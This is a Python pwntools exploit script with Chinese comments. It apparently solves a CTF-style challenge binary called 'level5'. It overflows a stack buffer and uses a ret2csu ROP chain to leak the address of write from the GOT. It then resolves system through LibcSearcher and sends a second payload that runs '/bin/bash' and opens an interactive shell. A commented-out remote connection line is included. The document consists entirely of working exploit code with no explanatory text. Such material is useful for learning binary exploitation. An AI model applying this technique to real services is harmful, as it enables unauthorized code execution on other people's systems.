from pwn import *
from LibcSearcher import *
context(os='linux', arch='amd64', log_level='debug')
# context.terminal = ['code-insiders', '--locate-shell-integration-path', 'bash']
context.terminal = ['tmux', 'splitw', '-v']
content = 1

elf_path = "./level5"
elf = ELF(elf_path)
rop = ROP(elf)


def exp():
    if content == 1:
        io = process(elf_path)
        # gdb.attach(proc.pidof(io)[0], gdbscript="b vulnerable_function")
    else:
        io = process(elf_path)
        # io = remote('',)

    cmd = "/bin/bash"
    pop_rbx_rbp_r12_r13_r14_r15_ret = 0x0040061A
    mov_rdx_rsi_edi = 0x00400600
    read_plt_addr = elf.plt['read']
    read_got_addr = elf.got['read']
    write_plt_addr = elf.plt['write']
    write_got_addr = elf.got['write']
    vuln_addr = elf.symbols['vulnerable_function']
    cmd_addr = elf.bss(0x100)

    def csu_ret(rbx, rbp, fun, rdx, rsi, edi):
        """
        rbp = 1
        rbx = 0
        函数最终执行位置ret出处
        """
        payload = p64(pop_rbx_rbp_r12_r13_r14_r15_ret)
        payload += p64(rbx)+p64(rbp)+p64(fun)+p64(rdx) + \
            p64(rsi)+p64(edi)
        payload += p64(mov_rdx_rsi_edi)
        # 此处是为了填充第二次的pop_rbx_rbp_r12_r13_r14_r15_ret，实际上此处可以用来输入下一次csu的参数
        payload += b'A'*48+b'A'*8
        return payload

    payload = b'A'*128
    payload += b'A'*8

    # # 全rop链构建
    # rop.write(1, write_got_addr)
    # rop.read(0, cmd_addr)
    # payload += rop.chain()

    # re2csu形式
    payload += csu_ret(0, 1, write_got_addr, 0x8, write_got_addr, 1)
    payload += csu_ret(0, 1, read_got_addr, len(cmd), cmd_addr, 0)

    payload += p64(vuln_addr)

    io.recvuntil("Hello, World\n")
    io.send(payload)

    write_addr = u64(io.recv(8))
    libc = LibcSearcher('write', write_addr)
    libc_base_addr = write_addr - libc.dump('write')
    system_addr = libc_base_addr + libc.dump('system')

    io.send(cmd)
    # pause

    payload = b'A'*128
    payload += b'A'*8
    payload += p64(rop.rdi[0])+p64(cmd_addr)
    payload += p64(system_addr)
    io.send(payload)

    io.interactive()


if __name__ == "__main__":
    exp()
